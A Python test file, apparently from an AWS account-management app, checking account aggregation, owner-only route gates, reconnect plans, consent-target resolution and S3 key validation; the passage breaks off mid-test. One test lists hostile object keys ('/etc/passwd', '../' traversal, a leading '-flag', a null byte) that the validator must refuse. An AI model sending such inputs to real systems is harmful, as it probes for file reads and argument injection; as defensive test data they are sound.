"""AWS Control P0 — account aggregation, reconnect classification, route gates.

The properties that must hold before anything billable ever ships on this app:

1. **Aggregation is account-shaped and honest.** Profiles group by the account
   the live probe resolves; a probe failure falls back to the account the
   registry recorded (grouping stays stable), and a profile with neither lands
   in the ``unknown`` pseudo-row instead of inventing an account. Summaries
   are explicit nulls — P0 measured nothing, so the page must say "not
   measured", never a fake zero.
2. **The one light per account is derived, not stored**: all-probes-ok → ok,
   any-failed → degraded, no-account → unknown.
3. **Every route is gated** — 403 while the app is disabled, owner-only once
   it is on. Account ids and caller ARNs are what the consent leaf is fenced
   from, so a non-owner (app token, allow-listed messaging user) must not
   read them here either.
4. **Reconnect never executes.** The plan endpoint classifies and returns
   display text; the profile must be REGISTERED or the request 404s, so
   attacker-shaped names are never echoed into a guidance card.
5. **The consent enum grew without changing the mechanism**: ``s3``/``ce``
   are gated services with labels, and their (profile, region) target resolves
   through the SAME healthy-first policy the engine uses for the calls those
   grants authorize — the registry default picks the account, ``_pick_profile``
   picks the key, and only a state with no working key at all falls back to
   naming the default so the card can still explain itself.
"""

from __future__ import annotations

import asyncio
import json
from unittest import mock
from unittest.mock import AsyncMock

import pytest
from aws_control_app_helpers import (  # noqa: F401 -- fixtures are used by name
    ACCOUNT,
    _enabled_owner_env,
    _fresh_snapshot,
    _payload,
    _registered,
    _request,
)

from kiro_crew import aws_consent
from kiro_crew.apps.builtins.aws_control.backend import accounts as accounts_mod
from kiro_crew.apps.builtins.aws_control.backend import routes as routes_mod

#: The full one-PR contract, as a table — a route added later without a gate
#: fails the inventory assertion rather than shipping open.
P0_ROUTES: tuple[tuple[str, str], ...] = (
    ("GET", "/accounts"),
    ("GET", "/profiles/available"),
    ("GET", "/profiles/{name}/reconnect-plan"),
    ("GET", "/drive/{account}"),
    ("GET", "/drive/{account}/list"),
    ("GET", "/drive/{account}/download"),
    ("GET", "/drive/{account}/preview"),
    ("GET", "/drive/{account}/search"),
    ("GET", "/costs/{account}"),
    ("GET", "/library/{account}"),
    ("GET", "/backup/{account}"),
    ("GET", "/shares"),
    ("GET", "/iam-policy"),
    ("POST", "/profiles/register"),
    ("POST", "/profiles/unregister"),
    ("POST", "/drive/{account}/bootstrap"),
    ("POST", "/drive/{account}/upload"),
    ("POST", "/drive/{account}/delete"),
    ("POST", "/drive/{account}/move"),
    ("POST", "/drive/{account}/folder"),
    ("POST", "/drive/{account}/folder/delete"),
    ("POST", "/drive/{account}/share"),
    ("POST", "/shares/{id}/forget"),
    ("POST", "/library/{account}/push"),
    ("POST", "/library/{account}/remove"),
    ("POST", "/backup/{account}/run"),
    ("POST", "/backup/{account}/nightly"),
    ("POST", "/backup/{account}/retention"),
    ("POST", "/backup/{account}/nightly-sessions"),
    ("POST", "/backup/{account}/layer-b"),
    ("POST", "/backup/{account}/restore"),
    # Not account-scoped: an install is the same install whichever account it
    # backs up to, so a name per account would mint the confusion the install id
    # exists to remove.
    ("POST", "/install/label"),
)

#: Every POST is a mutation and must also refuse restricted sessions.
MUTATIONS: tuple[tuple[str, str], ...] = tuple((m, p) for (m, p) in P0_ROUTES if m == "POST")


def _identity(ok: bool, account: str = "", arn: str = "", detail: str = "") -> aws_consent.Identity:
    return aws_consent.Identity(ok=ok, account=account, arn=arn, detail=detail)


def _registry(entries: list[dict], default: str = "") -> dict:
    return {"version": 2, "profiles": entries, "default": default}


def _entry(name: str, region: str = "us-east-1", account: str = "") -> dict:
    return {"name": name, "region": region, "account": account, "verified_at": "", "note": ""}


def _snapshot_of(
    registry: dict,
    identities: dict[str, aws_consent.Identity],
    kind: str = accounts_mod.KIND_SSO,
) -> dict:
    """Build a real account snapshot from a registry plus canned probe results.

    Goes through ``list_accounts`` rather than hand-writing the payload so the
    grouping, the default marking and the recorded-account fallback under test
    are the module's own, not the fixture's.
    """

    async def probe(profile: str, region: str, **_kw) -> aws_consent.Identity:
        return identities[profile]

    with (
        mock.patch.object(accounts_mod.deploy_profiles, "load_registry", return_value=registry),
        mock.patch.object(accounts_mod.aws_consent, "probe_identity", side_effect=probe),
        mock.patch.object(accounts_mod, "classify_profile", AsyncMock(return_value=kind)),
    ):
        return asyncio.run(accounts_mod.list_accounts(refresh=True))


# ---------------------------------------------------------------------------
# Aggregation
# ---------------------------------------------------------------------------


class TestAggregation:
    def _snapshot(self, registry: dict, identities: dict[str, aws_consent.Identity]) -> dict:
        return _snapshot_of(registry, identities)

    def test_profiles_group_by_resolved_account(self):
        snap = self._snapshot(
            _registry([_entry("a"), _entry("b"), _entry("c")], default="a"),
            {
                "a": _identity(True, account="111122223333", arn="arn:a"),
                "b": _identity(True, account="111122223333", arn="arn:b"),
                "c": _identity(True, account="444455556666", arn="arn:c"),
            },
        )
        by_account = {row["account"]: row for row in snap["accounts"]}
        assert set(by_account) == {"111122223333", "444455556666"}
        assert [p["name"] for p in by_account["111122223333"]["profiles"]] == ["a", "b"]
        assert by_account["111122223333"]["health"] == "ok"
        assert snap["totals"] == {"accounts": 2, "profiles": 3, "profilesHealthy": 3}
        # The registry default is marked on its profile, not invented elsewhere.
        assert by_account["111122223333"]["profiles"][0]["default"] is True

    def test_failed_probe_falls_back_to_recorded_account_and_degrades(self):
        snap = self._snapshot(
            _registry([_entry("a"), _entry("b", account="111122223333")]),
            {
                "a": _identity(True, account="111122223333"),
                "b": _identity(False, detail="SSO session expired"),
            },
        )
        (row,) = snap["accounts"]
        assert row["account"] == "111122223333"
        assert row["health"] == "degraded"
        failed = next(p for p in row["profiles"] if p["name"] == "b")
        assert failed["identityOk"] is False
        assert failed["detail"] == "SSO session expired"

    def test_unresolvable_profile_lands_in_unknown_pseudo_row_last(self):
        snap = self._snapshot(
            _registry([_entry("mystery"), _entry("a")]),
            {
                "mystery": _identity(False, detail="no credentials"),
                "a": _identity(True, account="111122223333"),
            },
        )
        assert [row["account"] for row in snap["accounts"]] == ["111122223333", ""]
        unknown = snap["accounts"][-1]
        assert unknown["health"] == "unknown"
        # The pseudo-row is not an account and must not count as one.
        assert snap["totals"]["accounts"] == 1

    def test_summaries_are_explicit_nulls_not_zeros(self):
        snap = self._snapshot(_registry([_entry("a")]), {"a": _identity(True, account="1")})
        summary = snap["accounts"][0]["summary"]
        assert summary == {"storage": None, "sites": None, "tasks": None, "costMonthToDate": None}

    def test_snapshot_is_cached_until_refresh(self):
        registry = _registry([_entry("a")])
        calls = 0

        async def probe(profile: str, region: str, **_kw) -> aws_consent.Identity:
            nonlocal calls
            calls += 1
            return _identity(True, account="1")

        with (
            mock.patch.object(accounts_mod.deploy_profiles, "load_registry", return_value=registry),
            mock.patch.object(accounts_mod.aws_consent, "probe_identity", side_effect=probe),
            mock.patch.object(
                accounts_mod, "classify_profile", AsyncMock(return_value=accounts_mod.KIND_OTHER)
            ),
        ):
            asyncio.run(accounts_mod.list_accounts())
            asyncio.run(accounts_mod.list_accounts())
            assert calls == 1  # served from the snapshot
            asyncio.run(accounts_mod.list_accounts(refresh=True))
            assert calls == 2  # refresh bypasses it


# ---------------------------------------------------------------------------
# Reconnect classification + plan
# ---------------------------------------------------------------------------


class TestReconnect:
    def _classify(self, responses: dict[str, tuple[int, str, str]]) -> str:
        def run_aws(args: list[str], profile: str, timeout: int = 30):
            return responses.get(args[2], (1, "", "not set"))

        with mock.patch.object(accounts_mod.engine, "run_aws", side_effect=run_aws):
            return asyncio.run(accounts_mod.classify_profile("p"))

    def test_sso_session_classifies_sso(self):
        assert self._classify({"sso_session": (0, "my-sso\n", "")}) == accounts_mod.KIND_SSO

    def test_legacy_sso_start_url_classifies_sso(self):
        assert (
            self._classify({"sso_start_url": (0, "https://x.awsapps.com/start\n", "")})
            == accounts_mod.KIND_SSO
        )

    def test_credential_process_classifies_credential_process(self):
        assert (
            self._classify({"credential_process": (0, "/usr/local/bin/tool\n", "")})
            == accounts_mod.KIND_CREDENTIAL_PROCESS
        )

    def test_nothing_set_classifies_other(self):
        assert self._classify({}) == accounts_mod.KIND_OTHER

    def test_plan_is_display_text_naming_the_profile(self):
        plan = accounts_mod.reconnect_plan(accounts_mod.KIND_SSO, "team-prod")
        assert plan["method"] == "terminal"
        assert plan["command"] == "aws sso login --profile team-prod"
        for kind in (accounts_mod.KIND_CREDENTIAL_PROCESS, accounts_mod.KIND_OTHER):
            plan = accounts_mod.reconnect_plan(kind, "team-prod")
            assert "team-prod" in plan["command"]
            assert plan["method"] == "terminal"


# ---------------------------------------------------------------------------
# Route gates
# ---------------------------------------------------------------------------


class TestRouteGates:
    def test_registrar_installs_exactly_the_p0_contract(self):
        assert set(_registered()) == set(P0_ROUTES)

    def test_every_route_refuses_while_disabled(self):
        handlers = _registered()
        with mock.patch.object(routes_mod, "is_app_enabled", return_value=False):
            for (method, path), handler in handlers.items():
                resp = asyncio.run(handler(_request(method, path)))  # type: ignore[operator]
                assert resp.status == 403, (method, path)
                assert _payload(resp)["code"] == "app_disabled"

    def test_every_route_refuses_non_owner_when_enabled(self):
        handlers = _registered()
        with mock.patch.object(routes_mod, "is_app_enabled", return_value=True):
            for (method, path), handler in handlers.items():
                # An app token (non-empty app claim) and a mismatched user are
                # the two callers the consent surface had to shut out.
                for req in (
                    _request(method, path, app_claim="some-app"),
                    _request(method, path, owner=False),
                ):
                    resp = asyncio.run(handler(req))  # type: ignore[operator]
                    assert resp.status == 403, (method, path)
                    assert _payload(resp)["code"] == "dashboard_owner_required"

    def test_accounts_returns_the_snapshot_for_the_owner(self):
        handlers = _registered()
        snapshot = {"accounts": [], "totals": {}, "generatedAt": "now"}
        with (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch.object(
                routes_mod.accounts_mod, "list_accounts", AsyncMock(return_value=snapshot)
            ) as listed,
            mock.patch.object(routes_mod.backup_mod, "nightly_no_key_skip", return_value=None),
        ):
            resp = asyncio.run(
                handlers[("GET", "/accounts")](_request("GET", "/accounts"))  # type: ignore[operator]
            )
        assert resp.status == 200
        assert _payload(resp) == {**snapshot, "nightlyNoKeySkip": None}
        listed.assert_awaited_once_with(refresh=False)

    def test_accounts_adds_fresh_no_key_skip_without_mutating_snapshot(self, tmp_path, monkeypatch):
        from kiro_crew.apps.builtins.aws_control.backend import backup as backup_mod

        monkeypatch.setattr(backup_mod, "_state_path", lambda: tmp_path / "backup.json")
        handlers = _registered()
        snapshot = _snapshot_of(
            _registry([_entry("broken", account=ACCOUNT)], default="broken"),
            {"broken": _identity(False, detail="ExpiredToken")},
        )
        with (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch.object(
                routes_mod.accounts_mod, "list_accounts", AsyncMock(return_value=snapshot)
            ) as listed,
        ):
            first = asyncio.run(
                handlers[("GET", "/accounts")](  # type: ignore[operator]
                    _request("GET", "/accounts")
                )
            )
            assert backup_mod.record_nightly_no_key_skip() is True
            record = backup_mod.nightly_no_key_skip()
            second = asyncio.run(
                handlers[("GET", "/accounts")](  # type: ignore[operator]
                    _request("GET", "/accounts")
                )
            )

        assert first.status == 200
        assert _payload(first)["nightlyNoKeySkip"] is None
        assert second.status == 200
        assert _payload(second)["nightlyNoKeySkip"] == record
        assert snapshot["accounts"][0]["profiles"][0]["identityOk"] is False
        assert "nightlyNoKeySkip" not in snapshot
        assert listed.await_args_list == [mock.call(refresh=False), mock.call(refresh=False)]

    def test_accounts_refresh_param_bypasses_cache(self):
        handlers = _registered()
        with (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch.object(
                routes_mod.accounts_mod,
                "list_accounts",
                AsyncMock(return_value={"accounts": []}),
            ) as listed,
        ):
            asyncio.run(
                handlers[("GET", "/accounts")](  # type: ignore[operator]
                    _request("GET", "/accounts?refresh=1")
                )
            )
        listed.assert_awaited_once_with(refresh=True)

    def test_reconnect_plan_404s_for_an_unregistered_profile(self):
        handlers = _registered()
        with (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch.object(
                routes_mod.deploy_profiles,
                "load_registry",
                return_value=_registry([_entry("real")]),
            ),
        ):
            resp = asyncio.run(
                handlers[("GET", "/profiles/{name}/reconnect-plan")](  # type: ignore[operator]
                    _request(
                        "GET",
                        "/profiles/ghost/reconnect-plan",
                        match_info={"name": "ghost"},
                    )
                )
            )
        assert resp.status == 404
        assert _payload(resp)["code"] == "unknown_profile"

    def test_reconnect_plan_returns_classification_for_registered_profile(self):
        handlers = _registered()
        with (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch.object(
                routes_mod.deploy_profiles,
                "load_registry",
                return_value=_registry([_entry("real")]),
            ),
            mock.patch.object(
                routes_mod.accounts_mod,
                "classify_profile",
                AsyncMock(return_value=accounts_mod.KIND_SSO),
            ),
        ):
            resp = asyncio.run(
                handlers[("GET", "/profiles/{name}/reconnect-plan")](  # type: ignore[operator]
                    _request(
                        "GET",
                        "/profiles/real/reconnect-plan",
                        match_info={"name": "real"},
                    )
                )
            )
        assert resp.status == 200
        plan = _payload(resp)
        assert plan["kind"] == accounts_mod.KIND_SSO
        assert plan["command"] == "aws sso login --profile real"


# ---------------------------------------------------------------------------
# Consent enum extension
# ---------------------------------------------------------------------------


class TestConsentExtension:
    def test_s3_and_ce_are_gated_services_with_labels(self):
        assert aws_consent.SERVICE_S3 in aws_consent.GATED_SERVICES
        assert aws_consent.SERVICE_COST_EXPLORER in aws_consent.GATED_SERVICES
        for service in (aws_consent.SERVICE_S3, aws_consent.SERVICE_COST_EXPLORER):
            assert aws_consent.SERVICE_LABELS[service]

    def test_existing_services_are_untouched(self):
        assert aws_consent.SERVICE_POLLY in aws_consent.GATED_SERVICES
        assert aws_consent.SERVICE_TRANSCRIBE in aws_consent.GATED_SERVICES

    def test_effective_target_names_the_default_chain_when_registry_is_empty(self):
        from kiro_crew.dashboard.handlers import aws_consent as consent_handlers
        from kiro_crew.deploy import profiles as deploy_profiles

        with mock.patch.object(deploy_profiles, "resolve_profile", return_value=None):
            target = asyncio.run(consent_handlers._effective_target(aws_consent.SERVICE_S3))
        # Empty profile = the CLI default chain, which the card labels
        # explicitly (credential_source names it); the region still defaults.
        assert target == ("", deploy_profiles.DEFAULT_REGION)


class TestConsentTargetTracksTheOperation:
    """The card must bind to the key the operation would actually run under.

    One policy, three readers: the consent card, the HTTP routes and the nightly
    backup loop all take a HEALTHY key of the account the registry default names.
    A second, unfiltered resolution is what these cases guard against — an
    unhealthy default binds the card to a key with no resolvable account,
    ``Confirm and enable`` refuses without one, and an account whose healthy
    sibling key serves every operation then cannot be granted consent at all. The
    same read in the nightly loop turns that into a silent forever-skip.
    """

    #: One account, two keys: the registry default is broken, its sibling works.
    #: This is the shape that deadlocks when health filtering is skipped.
    ACCOUNT = "111122223333"

    def _broken_default_snapshot(self) -> dict:
        return _snapshot_of(
            _registry(
                [
                    _entry("broken", region="us-east-1", account=self.ACCOUNT),
                    _entry("good", region="eu-west-1"),
                ],
                default="broken",
            ),
            {
                "broken": _identity(False, detail="ExpiredToken: the security token expired"),
                "good": _identity(True, account=self.ACCOUNT, arn="arn:good"),
            },
        )

    def test_a_broken_default_does_not_hide_the_accounts_healthy_key(self):
        from kiro_crew.dashboard.handlers import aws_consent as consent_handlers

        snapshot = self._broken_default_snapshot()
        with mock.patch.object(accounts_mod, "list_accounts", AsyncMock(return_value=snapshot)):
            target = asyncio.run(consent_handlers._effective_target(aws_consent.SERVICE_S3))
        assert target == ("good", "eu-west-1")

    def test_the_card_and_the_operation_resolve_the_same_key(self):
        """The invariant, asserted as an equality rather than a literal.

        A change to the resolution policy has to move both sides or fail here —
        the drift this class exists to catch.
        """
        from kiro_crew.dashboard.handlers import aws_consent as consent_handlers

        snapshot = self._broken_default_snapshot()
        with mock.patch.object(accounts_mod, "list_accounts", AsyncMock(return_value=snapshot)):
            operation = asyncio.run(accounts_mod.resolve_account_profile(self.ACCOUNT))
            for service in (aws_consent.SERVICE_S3, aws_consent.SERVICE_COST_EXPLORER):
                card = asyncio.run(consent_handlers._effective_target(service))
                assert card == operation

    def test_a_healthy_default_still_wins_over_its_siblings(self):
        from kiro_crew.dashboard.handlers import aws_consent as consent_handlers

        snapshot = _snapshot_of(
            _registry([_entry("first"), _entry("chosen", region="ap-south-1")], default="chosen"),
            {
                "first": _identity(True, account=self.ACCOUNT),
                "chosen": _identity(True, account=self.ACCOUNT),
            },
        )
        with mock.patch.object(accounts_mod, "list_accounts", AsyncMock(return_value=snapshot)):
            target = asyncio.run(consent_handlers._effective_target(aws_consent.SERVICE_S3))
        assert target == ("chosen", "ap-south-1")

    def test_another_accounts_healthy_key_is_never_substituted(self):
        """Health filtering must not walk out of the account the default names.

        Picking any healthy key in the registry would let the card offer a
        confirmation for someone else's account — a wrong bill, not a dead end.
        """
        from kiro_crew.dashboard.handlers import aws_consent as consent_handlers
        from kiro_crew.deploy import profiles as deploy_profiles

        snapshot = _snapshot_of(
            _registry(
                [_entry("broken", account=self.ACCOUNT), _entry("elsewhere")], default="broken"
            ),
            {
                "broken": _identity(False, detail="ExpiredToken"),
                "elsewhere": _identity(True, account="444455556666"),
            },
        )
        with (
            mock.patch.object(accounts_mod, "list_accounts", AsyncMock(return_value=snapshot)),
            mock.patch.object(
                deploy_profiles, "resolve_profile", return_value=("broken", "us-east-1")
            ),
        ):
            target = asyncio.run(consent_handlers._effective_target(aws_consent.SERVICE_S3))
        assert target == ("broken", "us-east-1")

    def test_nothing_healthy_still_names_the_default_so_the_card_can_explain(self):
        """The fallback still names a key, so the card can render its error.

        With no working key there is no operation to agree with, so the honest
        surface is the default's own STS error — that is what tells the reader
        the account has to be reconnected.
        """
        from kiro_crew.dashboard.handlers import aws_consent as consent_handlers
        from kiro_crew.deploy import profiles as deploy_profiles

        snapshot = _snapshot_of(
            _registry([_entry("broken", account=self.ACCOUNT)], default="broken"),
            {"broken": _identity(False, detail="ExpiredToken")},
        )
        with (
            mock.patch.object(accounts_mod, "list_accounts", AsyncMock(return_value=snapshot)),
            mock.patch.object(
                deploy_profiles, "resolve_profile", return_value=("broken", "us-east-1")
            ),
        ):
            for service in (aws_consent.SERVICE_S3, aws_consent.SERVICE_COST_EXPLORER):
                target = asyncio.run(consent_handlers._effective_target(service))
                assert target == ("broken", "us-east-1")

    def test_a_default_that_resolves_to_no_account_falls_back_too(self):
        """A default in the unresolved pseudo-row names no account to filter within."""
        from kiro_crew.dashboard.handlers import aws_consent as consent_handlers
        from kiro_crew.deploy import profiles as deploy_profiles

        snapshot = _snapshot_of(
            _registry([_entry("mystery"), _entry("good")], default="mystery"),
            {
                "mystery": _identity(False, detail="no credentials"),
                "good": _identity(True, account=self.ACCOUNT),
            },
        )
        with (
            mock.patch.object(accounts_mod, "list_accounts", AsyncMock(return_value=snapshot)),
            mock.patch.object(
                deploy_profiles, "resolve_profile", return_value=("mystery", "us-east-1")
            ),
        ):
            target = asyncio.run(consent_handlers._effective_target(aws_consent.SERVICE_S3))
        assert target == ("mystery", "us-east-1")

    def test_the_fallback_scrubs_a_credential_shaped_profile_name(self):
        """The registry is agent-writable, and its charset is an access key's shape.

        The snapshot path is scrubbed as it is built; the fallback reads the
        registry directly, so it has to be scrubbed on the same side of the
        return or a profile named after a secret reaches the card's JSON verbatim.
        """
        from kiro_crew.dashboard.handlers import aws_consent as consent_handlers
        from kiro_crew.deploy import profiles as deploy_profiles

        secret = "AKIAIOSFODNN7EXAMPLE"
        snapshot = _snapshot_of(
            _registry([_entry(secret, account=self.ACCOUNT)], default=secret),
            {secret: _identity(False, detail="ExpiredToken")},
        )
        with (
            mock.patch.object(accounts_mod, "list_accounts", AsyncMock(return_value=snapshot)),
            mock.patch.object(
                deploy_profiles, "resolve_profile", return_value=(secret, "us-east-1")
            ),
        ):
            profile, region = asyncio.run(
                consent_handlers._effective_target(aws_consent.SERVICE_S3)
            )
        assert secret not in profile
        assert profile == "[REDACTED: credential]"
        assert region == "us-east-1"

    def test_a_failed_probe_sweep_degrades_instead_of_failing_the_surface(self):
        """The sweep spawns the AWS CLI; it must not be able to 500 the card.

        The degraded answer is the provider default chain, whose two values are
        module constants — with the resolver unreachable there is no scrubbed
        registry read to fall back on, and an unscrubbed one must not take its
        place.
        """
        from kiro_crew.dashboard.handlers import aws_consent as consent_handlers
        from kiro_crew.deploy import profiles as deploy_profiles

        with mock.patch.object(
            accounts_mod,
            "resolve_consent_target",
            AsyncMock(side_effect=RuntimeError("no sandbox")),
        ):
            target = asyncio.run(consent_handlers._effective_target(aws_consent.SERVICE_S3))
        assert target == ("", deploy_profiles.DEFAULT_REGION)

    def test_the_nightly_loop_runs_under_the_key_the_grant_names(self):
        """The unattended path is the one nobody watches fail.

        The loop's consent check compares the grant against the key it is about
        to use, so a loop resolving the raw default while the grant names the
        account's healthy sibling skips on every wake, forever, with only a log
        line to say so.
        """
        from kiro_crew.apps.builtins.aws_control import hooks

        snapshot = self._broken_default_snapshot()
        gated: list[tuple[str, str]] = []

        async def refuse_and_log(service: str, *, profile: str, region: str) -> bool:
            gated.append((profile, region))
            return False  # stop before any AWS work; the argv is what is pinned

        with (
            mock.patch.object(accounts_mod, "list_accounts", AsyncMock(return_value=snapshot)),
            mock.patch.object(
                hooks.aws_consent,
                "probe_identity",
                AsyncMock(return_value=aws_consent.Identity(ok=True, account=self.ACCOUNT)),
            ),
            mock.patch.object(hooks.backup_mod, "due_for_nightly", return_value=True),
            mock.patch.object(hooks.backup_mod, "due_for_sessions_nightly", return_value=False),
            mock.patch.object(hooks.aws_consent, "refuse_and_log", refuse_and_log),
        ):
            asyncio.run(hooks._run_once(mock.Mock(start_async=AsyncMock())))
            operation = asyncio.run(accounts_mod.resolve_account_profile(self.ACCOUNT))

        assert gated == [("good", "eu-west-1")]
        assert gated[0] == operation

    def test_the_nightly_loop_skips_when_no_key_is_healthy(self):
        from kiro_crew.apps.builtins.aws_control import hooks

        snapshot = _snapshot_of(
            _registry([_entry("broken", account=self.ACCOUNT)], default="broken"),
            {"broken": _identity(False, detail="ExpiredToken")},
        )
        sdk = mock.Mock(start_async=AsyncMock())
        with (
            mock.patch.object(accounts_mod, "list_accounts", AsyncMock(return_value=snapshot)),
            mock.patch.object(hooks.aws_consent, "probe_identity") as probe,
            mock.patch.object(hooks.backup_mod, "due_for_nightly") as due,
        ):
            asyncio.run(hooks._run_once(sdk))
        # No probe, no due-check, no consent check, no claim: there is no key to
        # run under, so the loop stops before it can name one.
        probe.assert_not_called()
        due.assert_not_called()
        sdk.start_async.assert_not_called()

    def test_a_skipped_nightly_with_no_key_is_recorded_and_warns_once_per_streak(
        self, tmp_path, monkeypatch
    ):
        """A nightly the owner enabled, skipped for want of a key, is VISIBLE.

        With no healthy key the loop skips before any account resolves. When a
        nightly IS scheduled it records an install-global skip the accounts read
        serves as ``nightlyNoKeySkip`` and warns once per streak, instead of
        one unread INFO per wake.
        """
        from kiro_crew.apps.builtins.aws_control import hooks
        from kiro_crew.apps.builtins.aws_control.backend import backup as backup_mod

        monkeypatch.setattr(backup_mod, "_state_path", lambda: tmp_path / "backup.json")
        # The owner turned a nightly on for some account.
        backup_mod.set_nightly(self.ACCOUNT, True)

        snapshot = _snapshot_of(
            _registry([_entry("broken", account=self.ACCOUNT)], default="broken"),
            {"broken": _identity(False, detail="ExpiredToken")},
        )
        sdk = mock.Mock(start_async=AsyncMock())
        with (
            mock.patch.object(accounts_mod, "list_accounts", AsyncMock(return_value=snapshot)),
            mock.patch.object(hooks.logger, "warning") as warn,
        ):
            asyncio.run(hooks._run_once(sdk))  # first wake of the streak
            asyncio.run(hooks._run_once(sdk))  # second wake, same streak

        # The skip is now a record the accounts read serves, not nothing.
        row = backup_mod.nightly_no_key_skip()
        assert row is not None
        assert row["consecutive"] == 2
        assert row["reason"] == "no_working_key"
        sdk.start_async.assert_not_called()
        # Warned on the FIRST wake only, not once per wake.
        assert warn.call_count == 1

    def test_no_skip_is_recorded_when_no_nightly_is_scheduled(self, tmp_path, monkeypatch):
        """An install that never enabled a nightly must stay silent on a no-key wake."""
        from kiro_crew.apps.builtins.aws_control import hooks
        from kiro_crew.apps.builtins.aws_control.backend import backup as backup_mod

        monkeypatch.setattr(backup_mod, "_state_path", lambda: tmp_path / "backup.json")
        snapshot = _snapshot_of(
            _registry([_entry("broken", account=self.ACCOUNT)], default="broken"),
            {"broken": _identity(False, detail="ExpiredToken")},
        )
        with mock.patch.object(accounts_mod, "list_accounts", AsyncMock(return_value=snapshot)):
            asyncio.run(hooks._run_once(mock.Mock(start_async=AsyncMock())))
        assert backup_mod.nightly_no_key_skip() is None

    def test_a_no_key_wake_with_nothing_scheduled_clears_a_standing_skip(
        self, tmp_path, monkeypatch
    ):
        """With no nightly scheduled, a no-key wake drops a standing skip record.

        The accounts read stops serving ``nightlyNoKeySkip``, and a nightly turned on
        later starts a fresh streak whose first no-key wake warns.
        """
        from kiro_crew.apps.builtins.aws_control import hooks
        from kiro_crew.apps.builtins.aws_control.backend import backup as backup_mod

        monkeypatch.setattr(backup_mod, "_state_path", lambda: tmp_path / "backup.json")
        backup_mod.set_nightly(self.ACCOUNT, True)
        backup_mod.record_nightly_no_key_skip()  # a streak was standing
        backup_mod.set_nightly(self.ACCOUNT, False)  # then the owner turned it off
        assert backup_mod.nightly_no_key_skip() is not None

        snapshot = _snapshot_of(
            _registry([_entry("broken", account=self.ACCOUNT)], default="broken"),
            {"broken": _identity(False, detail="ExpiredToken")},
        )
        sdk = mock.Mock(start_async=AsyncMock())
        with (
            mock.patch.object(accounts_mod, "list_accounts", AsyncMock(return_value=snapshot)),
            mock.patch.object(hooks.logger, "warning") as warn,
        ):
            asyncio.run(hooks._run_once(sdk))
            assert backup_mod.nightly_no_key_skip() is None
            warn.assert_not_called()

            backup_mod.set_nightly(self.ACCOUNT, True)  # turned on again, still no key
            asyncio.run(hooks._run_once(sdk))

        row = backup_mod.nightly_no_key_skip()
        assert row is not None
        assert row["consecutive"] == 1
        assert warn.call_count == 1
        sdk.start_async.assert_not_called()

    def test_a_resolved_key_clears_a_standing_no_key_skip(self, tmp_path, monkeypatch):
        """Once a key resolves again the standing skip record is dropped.

        The clear runs the moment the account resolves, before the consent gate,
        so even a wake that then stops at consent clears a stale skip.
        """
        from kiro_crew.apps.builtins.aws_control import hooks
        from kiro_crew.apps.builtins.aws_control.backend import backup as backup_mod

        monkeypatch.setattr(backup_mod, "_state_path", lambda: tmp_path / "backup.json")
        backup_mod.set_nightly(self.ACCOUNT, True)
        backup_mod.record_nightly_no_key_skip()  # a streak was standing
        assert backup_mod.nightly_no_key_skip() is not None

        snapshot = _snapshot_of(
            _registry([_entry("good", account=self.ACCOUNT)], default="good"),
            {"good": _identity(True, account=self.ACCOUNT, arn="arn:good")},
        )

        async def refuse_and_log(service, *, profile, region):
            return False  # stop before any AWS work; the clear already ran

        with (
            mock.patch.object(accounts_mod, "list_accounts", AsyncMock(return_value=snapshot)),
            mock.patch.object(
                hooks.aws_consent,
                "probe_identity",
                AsyncMock(return_value=aws_consent.Identity(ok=True, account=self.ACCOUNT)),
            ),
            mock.patch.object(hooks.backup_mod, "due_for_nightly", return_value=True),
            mock.patch.object(hooks.backup_mod, "due_for_sessions_nightly", return_value=False),
            mock.patch.object(hooks.aws_consent, "refuse_and_log", refuse_and_log),
        ):
            asyncio.run(hooks._run_once(mock.Mock(start_async=AsyncMock())))

        assert backup_mod.nightly_no_key_skip() is None

    def test_the_voice_services_do_not_touch_the_account_snapshot(self):
        """Polly and Transcribe read their own config; only s3/ce use the registry."""
        from kiro_crew.dashboard.handlers import aws_consent as consent_handlers
        from kiro_crew.slack.handler import _vc

        swept = AsyncMock(side_effect=AssertionError("voice must not sweep the registry"))
        with (
            mock.patch.object(accounts_mod, "list_accounts", swept),
            mock.patch.object(_vc, "aws_profile", "voice"),
            mock.patch.object(_vc, "region", "eu-west-1"),
        ):
            assert asyncio.run(consent_handlers._effective_target("polly")) == (
                "voice",
                "eu-west-1",
            )
        swept.assert_not_awaited()


# ---------------------------------------------------------------------------
# Storage engine — key validation and presign clamp
# ---------------------------------------------------------------------------


class TestStorageValidation:
    def test_good_keys_pass(self):
        from kiro_crew.apps.builtins.aws_control.backend import storage

        for key in ("a.txt", "photos 2026/img (1).png", "a/b/c.tar.gz", "x_y" * 3):
            assert storage.validate_key(key) is None, key

    def test_hostile_keys_are_refused(self):
        from kiro_crew.apps.builtins.aws_control.backend import storage

        for key in (
            "",
            "/etc/passwd",
            "a/../b",
            "a//b",
            ".hidden",
            "..",
            "a/",
            "-flag",
            "a\x00b",
            "x" * 901,
            "a/./b",
        ):
            assert storage.validate_key(key) is not None, key

    def test_section_prefixes_cover_exactly_the_three_sections(self):
        from kiro_crew.apps.builtins.aws_control.backend import storage

        assert storage.SECTION_PREFIXES == {
            "library": "artifacts/",
            "drive": "drive/",
            "backup": "backup/",
        }

    def test_presign_clamps_expiry_to_the_sigv4_ceiling(self):
        from kiro_crew.apps.builtins.aws_control.backend import storage

        seen: dict[str, str] = {}

        def checked(args, profile, *, action, timeout=30):
            seen["expires"] = args[args.index("--expires-in") + 1]
            return "https://example.com/signed\n"

        with mock.patch.object(storage, "_checked", side_effect=checked):
            storage.presign("p", "us-east-1", "b", "drive", "k.txt", 10**9)
            assert seen["expires"] == str(storage.PRESIGN_MAX_SECS)
            storage.presign("p", "us-east-1", "b", "drive", "k.txt", 1)
            assert seen["expires"] == "60"

    def test_find_drive_refuses_ambiguity(self):
        from kiro_crew.apps.builtins.aws_control.backend import storage
        from kiro_crew.deploy.engine import AWSError

        two = json.dumps(
            {
                "ResourceTagMappingList": [
                    {"ResourceARN": "arn:aws:s3:::kirocrew-drive-0123456789ab"},
                    {"ResourceARN": "arn:aws:s3:::kirocrew-drive-ba9876543210"},
                ]
            }
        )
        with mock.patch.object(storage, "_checked", return_value=two):
